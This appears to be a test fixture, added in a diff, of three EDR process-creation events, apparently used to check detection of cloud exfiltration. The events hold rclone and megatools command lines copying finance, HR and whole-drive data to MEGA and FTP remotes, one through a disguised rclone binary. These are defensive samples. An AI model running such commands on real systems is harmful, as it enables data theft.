@@ -1,0 +1,58 @@
+[
+  {
+    "_source": "crowdstrike_fdr",
+    "event_simpleName": "ProcessRollup2",
+    "aid": "0123456789abcdef0123456789abcdef",
+    "cid": "fedcba9876543210fedcba9876543210",
+    "event_platform": "Win",
+    "ImageFileName": "\\Device\\HarddiskVolume3\\Users\\Public\\rclone.exe",
+    "CommandLine": "rclone.exe copy D:\\Finance mega:backup --transfers 8 --auto-confirm",
+    "ParentBaseFileName": "cmd.exe",
+    "RawProcessId": "4242",
+    "UserSid": "S-1-5-21-1111111111-2222222222-3333333333-1104"
+  },
+  {
+    "_source": "sentinelone_cloudfunnel",
+    "event": {
+      "category": "process",
+      "type": "Process Creation"
+    },
+    "agent": {
+      "uuid": "11112222333344445555666677778888"
+    },
+    "endpoint": {
+      "name": "host05.example.com",
+      "os": "linux"
+    },
+    "tgt": {
+      "process": {
+        "name": "megatools",
+        "cmdline": "megatools put --path /Root/x /srv/share/hr.tar",
+        "image": {
+          "path": "/usr/bin/megatools"
+        },
+        "user": "jdoe"
+      }
+    },
+    "src": {
+      "process": {
+        "name": "bash"
+      }
+    }
+  },
+  {
+    "_source": "defender_hunting",
+    "category": "AdvancedHunting-DeviceProcessEvents",
+    "tenantId": "11111111-1111-1111-1111-111111111111",
+    "properties": {
+      "DeviceId": "4444444444444444444444444444444444444444",
+      "DeviceName": "fs-01.example.org",
+      "ActionType": "ProcessCreated",
+      "FileName": "sihosts.exe",
+      "FolderPath": "C:\\ProgramData\\sihosts.exe",
+      "ProcessCommandLine": "C:\\programdata\\sihosts.exe copy \"E:\" ftp:fs-01\\E -q --exclude \"*.{exe,dll,iso}\" --inplace --ignore-existing --auto-confirm --multi-thread-streams 45 --transfers 45 --min-size 1k --max-age 90M",
+      "InitiatingProcessFileName": "cmd.exe",
+      "AccountName": "svc-backup"
+    }
+  }
+]
